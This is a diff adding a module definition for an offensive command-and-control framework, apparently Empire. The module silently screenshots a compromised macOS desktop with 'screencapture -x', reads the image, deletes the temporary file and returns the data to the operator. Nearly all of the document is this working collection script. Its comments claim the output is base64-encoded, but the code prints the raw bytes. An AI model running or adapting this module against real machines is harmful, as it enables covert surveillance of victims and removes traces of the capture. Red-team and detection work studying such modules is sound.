@@ -1,0 +1,34 @@
+name: Screenshot
+authors:
+  - '@harmj0y'
+description: Takes a screenshot of an OSX desktop using screencapture and returns
+  the data.
+software: ''
+techniques:
+  - T1113
+background: false
+output_extension: png
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments: [ ]
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+  - name: SavePath
+    description: Path of the temporary screenshot file to save.
+    required: true
+    value: /tmp/out.png
+script: |
+  # take a screenshot using screencapture
+  run_command('screencapture -x {{ SavePath }}')
+  # base64 up resulting file, delete the file, return the base64 of the png output
+  #   mocked from the Empire screenshot module
+  f = open('{{ SavePath }}', 'rb')
+  data = f.read()
+  f.close()
+  run_command('rm -f {{ SavePath }}')
+  print(data)
